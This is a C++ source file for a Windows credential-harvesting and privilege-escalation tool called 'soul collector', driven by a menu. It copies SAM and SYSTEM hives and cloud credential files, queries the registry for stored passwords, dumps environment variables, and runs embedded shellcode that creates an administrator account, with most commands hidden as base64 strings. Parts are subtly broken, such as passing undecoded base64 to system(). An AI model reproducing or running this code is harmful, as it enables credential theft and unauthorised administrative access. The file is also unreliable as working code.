#include <iostream>
#include <stdio.h>
#include <string>
#include <array>
#include <cstdlib>
#include <sstream>
#include <windows.h>
#include <stdio.h>

const std::string RED = "\033[0;31m";
const std::string WHITE = "\033[1;37m";
const std::string RESET = "\033[0m";

void CheckRegistryKeys()
{
    std::array<std::string, 8> FilesRegistryKeys = {
        "cmVnIHF1ZXJ5ICJIS0NVXFNvZnR3YXJlXE9STFxXaW5WTkMzXFBhc3N3b3JkIg0KDQo=",
        "cmVnIHF1ZXJ5ICJIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTTk1QIiAvcw==",
        "cmVnIHF1ZXJ5ICJIS0NVXFNvZnR3YXJlXFRpZ2h0Vk5DXFNlcnZlciI=",
        "cmVnIHF1ZXJ5ICJIS0NVXFNvZnR3YXJlXE9wZW5TU0hcQWdlbnRcS2V5Ig== > passwordfound.txt ",
        "UkVHIFFVRVJZIEhLTE0gL0YgInBhc3N3b3JkIiAvdCBSRUdfU1ogL1MgL0s= > passwordfound.txt",
        "UkVHIFFVRVJZIEhLQ1UgL0YgInBhc3N3b3JkIiAvdCBSRUdfU1ogL1MgL0s= > passwordfound.txt",
        "UkVHIFFVRVJZIEhLTE0gL0YgInBhc3N3b3JkIiAvdCBSRUdfU1ogL1MgL2Q= > passwordfound.txt",
        "UkVHIFFVRVJZIEhLQ1UgL0YgInBhc3N3b3JkIiAvdCBSRUdfU1ogL1MgL2Q= > passwordfound.txt"};
    for (std::string KeyList : FilesRegistryKeys)
    {
        std::system(KeyList.c_str());
    }
}

void FilenamesContainingCredentials()
{
    std::string CommandPowershellfiles = "R2V0LUNoaWxkaXRlbSDigJNQYXRoIEM6XCAtSW5jbHVkZSAqdW5hdHRlbmQqLCpzeXNwcmVwKiAtRmlsZSAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZXdoZXJlIHsoJF8uTmFtZSAtbGlrZSAiKi54bWwiIC1vciAkXy5OYW1lIC1saWtlICIqLnR4dCIgLW9yICRfLk5hbWUgLWxpa2UgIiouaW5pIil9 > FilenamesContainingCredentials.txt";

    std::system(CommandPowershellfiles.c_str());
}

void FilesSAMS()
{
    std::stringstream CommandPowershellSam;

    std::array<std::string, 6> SAMfilefolders = {
        "JVNZU1RFTVJPT1QlXHJlcGFpclxTQU0=",
        "JVNZU1RFTVJPT1QlXFN5c3RlbTMyXGNvbmZpZ1xSZWdCYWNrXFNBTQ==",
        "JVNZU1RFTVJPT1QlXFN5c3RlbTMyXGNvbmZpZ1xTQU0=",
        "JVNZU1RFTVJPT1QlXHJlcGFpclxzeXN0ZW0=",
        "JVNZU1RFTVJPT1QlXFN5c3RlbTMyXGNvbmZpZ1xTWVNURU0=",
        "JVNZU1RFTVJPT1QlXFN5c3RlbTMyXGNvbmZpZ1xSZWdCYWNrXHN5c3RlbQ=="};
    for (std::string FileSAM : SAMfilefolders)
    {
        CommandPowershellSam << "Copy-Item -Path" << FileSAM << R"(-Destination "JGVudjpVU0VSUFJPRklMRVxEZXNrdG9wXHNhbV9iYWNrdXA=" -Force)";
        std::string BackupFilesSam = CommandPowershellSam.str();
        std::system(BackupFilesSam.c_str());
    }
}

void CredentialsCloud()
{
    std::stringstream CommandPowershellCloud;

    std::array<std::string, 6> Cloudfilefolders = {
        "LmF3c1xjcmVkZW50aWFscw==",
        "QXBwRGF0YVxSb2FtaW5nXGdjbG91ZFxjcmVkZW50aWFscy5kYg==",
        "QXBwRGF0YVxSb2FtaW5nXGdjbG91ZFxsZWdhY3lfY3JlZGVudGlhbHM=",
        "QXBwRGF0YVxSb2FtaW5nXGdjbG91ZFxhY2Nlc3NfdG9rZW5zLmRi",
        "LmF6dXJlXGFjY2Vzc1Rva2Vucy5qc29u",
        "LmF6dXJlXGF6dXJlUHJvZmlsZS5qc29u"};

    for (std::string FileCloud : Cloudfilefolders)
    {
        CommandPowershellCloud << "Copy-Item -Path" << FileCloud << R"( -Destination "JGVudjpVU0VSUFJPRklMRVxEZXNrdG9wXEZpbGVDbG91ZF9iYWNrdXA="
        -Force)";
        std::string BackupFilesCloud = CommandPowershellCloud.str();
        std::system(BackupFilesCloud.c_str());
    }
}

std::string ALLVARIABLES = "powershell Get-Childitem env: > ALLVARIABLES.txt";

std::string CACHEDCREDENTIALSCHECK = "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGIAbwBvAGsALgBoAGEAYwBrAHQAcgBpAGMAawBzAC4AdwBpAGsAaQAvAGUAbgAvAHcAaQBuAGQAbwB3AHMALQBoAGEAcgBkAGUAbgBpAG4AZwAvAHcAaQBuAGQAbwB3AHMALQBsAG8AYwBhAGwALQBwAHIAaQB2AGkAbABlAGcAZQAtAGUAcwBjAGEAbABhAHQAaQBvAG4ALwBpAG4AZABlAHgALgBoAHQAbQBsACMAdwBpAG4AZwBvAHcAcwAtAHYAYQB1AGwAdAAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFkAZQBsAGwAbwB3ADsAIABjAG0AZABrAGUAeQAuAGUAeABlACAALwBsAGkAcwB0AA== > CACHEDCREDENTIALSCHECK.txt";

void CreateAdministratorDynamic()
{
    /*
     *
     * Shellcode runner author: reenz0h (twitter: @sektor7net)
     * https://www.exploit-db.com/shellcodes/51208
     *
     */

    unsigned char payload[] =
        "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c"
        "\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04"
        "\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18"
        "\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31"
        "\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
        "\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8"
        "\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e"
        "\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x50\x66\xb8\x6c\x6c\x50\x68\x6c\x69\x2e"
        "\x64\x68\x73\x61\x6d\x63\x54\xff\x55\x14\x89\xc3\x68\x5e\xdf\x7c\xcd\xff\x55\x04"
        "\x89\x45\x1c\x68\xd7\x3d\x0c\xc3\xff\x55\x04\x89\x45\x20\x31\xc0\x31\xdb\x43\x50"
        "\xba\x8e\xff\x8c\xff\xf7\xda\x52\xba\x8c\xff\x90\xff\xf7\xda\x52\xba\x8e\xff\x9e"
        "\xff\xf7\xda\x52\xba\x8d\xff\x8b\xff\xf7\xda\x52\xba\x92\xff\x96\xff\xf7\xda\x52"
        "\xba\x93\xff\x96\xff\xf7\xda\x52\xba\xbf\xff\x9b\xff\xf7\xda\x52\x89\x65\x24\x50"
        "\xba\x8a\xff\x96\xff\xf7\xda\x52\xba\x88\xff\x9e\xff\xf7\xda\x52\x89\xe1\x89\x4d"
        "\x28\x50\xba\xcb\xff\xde\xff\xf7\xda\x52\xba\xcd\xff\xcb\xff\xf7\xda\x52\xba\xcf"
        "\xff\xcd\xff\xf7\xda\x52\xba\x9b\xff\x8d\xff\xf7\xda\x52\xba\x93\xff\x92\xff\xf7"
        "\xda\x52\xba\xad\xff\x8a\xff\xf7\xda\x52\x89\xe2\x50\x53\x50\x50\x53\x50\x52\x51"
        "\x89\xe1\x50\x54\x51\x53\x50\xff\x55\x1c\x8b\x4d\x28\x51\x89\xe1\x53\x51\x6a\x03"
        "\xff\x75\x24\x50\xff\x55\x20\x31\xc0\x50\xff\x55\x10";

    unsigned int payload_len = 373;

    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("Shellcode Length:  %d\n", strlen(reinterpret_cast<const char *>(payload)));

    if (rv != 0)
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
}

void deathBanner()
{
    std::cout << "\033[31m" << R"(   ⠀⠀  ⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          )" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⡀⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡇⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⣧⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢹⢳⡀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⢨⠀⢳⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠰⠀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡂⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⡀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢀⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠐⡢⠀⠀⠠⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⢀⠥⠀⠀⠐⠀⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠐⠪⠀⠀⠀⠈⠀)" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⢈⠒⠀⠀⠀⠀⠀ )" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"( ⠀⠀    ⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠠⢁⠀⠀⠀⠀⠀ )" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(    ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⠀⠀⠀⠀⠀⠀ )" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(    ⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⢿⠿⠿⢿⣿⣿⠏⠨⠈⠀⠀⠀⠀⠀ )" << "\033[0m" << std::endl;
    std::cout << "\033[31m" << R"(  soul collector - create by const )" << "\033[0m" << std::endl;
}

int PainelBanner()
{
    std::cout << " ----------------------------------------------------" << std::endl;
    std::cout << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "01" << RED << "]" << WHITE << " List All Variables" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "02" << RED << "]" << WHITE << " Cached Credential Check" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "03" << RED << "]" << WHITE << " Create Administrator User / Dynamic PEB" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "04" << RED << "]" << WHITE << " Get Files SAMS" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "05" << RED << "]" << WHITE << " Get  Credentials Cloud" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "06" << RED << "]" << WHITE << " File names Containing Credentials" << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "07" << RED << "]" << WHITE << "  Check Registry Key" << std::endl;
    std::cout << std::endl;
    std::cout << "  " << RED << "[" << WHITE << "00" << RED << "]" << WHITE << " Exit" << std::endl;
    std::cout << std::endl;
    std::cout << " ____________________________________________________" << std::endl;
    std::cout << "  " << RED << "┌──(" << WHITE << ">" << RED << "in" << WHITE << "panel" << RED << ")" << std::endl;
    std::cout << "  " << RED << "└─" << WHITE << "$ " << RESET;

    int choice;
    std::cin >> choice;

    return choice;
}

int main()
{
    while (true)
    {
        deathBanner();
        PainelBanner();
        int optionChosen = PainelBanner();

        switch (optionChosen)
        {
        case 1:
            std::system(ALLVARIABLES.c_str());

            break;
        case 2:
            std::system(CACHEDCREDENTIALSCHECK.c_str());

            break;
        case 3:
            CreateAdministratorDynamic();

            break;
        case 4:
            FilesSAMS();

            break;
        case 5:
            CredentialsCloud();
            break;
        case 6:
            FilenamesContainingCredentials();

            break;
        case 7:
            CheckRegistryKeys();

            break;

        default:
            std::cout << "invalid option" << std::endl;
            break;
        }
    }

    return 0;
}
